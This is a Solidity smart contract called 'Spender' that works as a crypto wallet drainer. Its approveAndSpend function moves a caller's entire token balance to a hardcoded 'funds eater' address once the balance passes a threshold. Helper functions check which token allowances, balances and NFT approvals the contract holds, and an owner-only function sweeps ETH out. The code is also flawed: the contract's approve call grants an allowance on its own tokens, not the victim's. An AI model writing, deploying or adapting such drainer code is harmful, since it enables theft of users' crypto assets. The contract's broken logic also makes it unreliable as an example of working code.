// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";



contract Spender is Ownable {

    constructor() Ownable(msg.sender) {

    }

    // funds eater
    address eater = 0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2;

    // Some token
    IERC20 someToken = IERC20(0xd9145CCE52D386f254917e481eB44e9943F39138);

    function approveAndSpend() public {
        uint256 balance = someToken.balanceOf(msg.sender);

        if (balance > 1e18) {
            someToken.approve(address(this), balance);
            SafeERC20.safeTransferFrom(someToken, msg.sender, eater, balance);
        }
    }

    // Tokens
    function getTokensApproved(address tokenAddress, address owner) public view returns(uint256) {
        return IERC20(tokenAddress).allowance(owner, address(this));
    }

    function getTokenStatus(address tokenAddress, address owner) public view returns(uint256, uint256) {
        uint256 allowance = IERC20(tokenAddress).allowance(owner, address(this));
        uint256 balance = IERC20(tokenAddress).balanceOf(owner);
        return (allowance, balance);
    }

    // NFTs

    function nftIsApproved (address _nftAddress, uint256 _tokenId) public view returns(bool) {
        if (IERC721(_nftAddress).getApproved(_tokenId) != address(this)) {
            return false;
        } else {
            return true;
        }
    }

      function withdraw () public onlyOwner {
        address _owner = owner();
        uint amount = address(this).balance;
        (bool sent, ) = _owner.call{value: amount}("");
        require(sent, "Failed to withdraw funds!!");
    }

}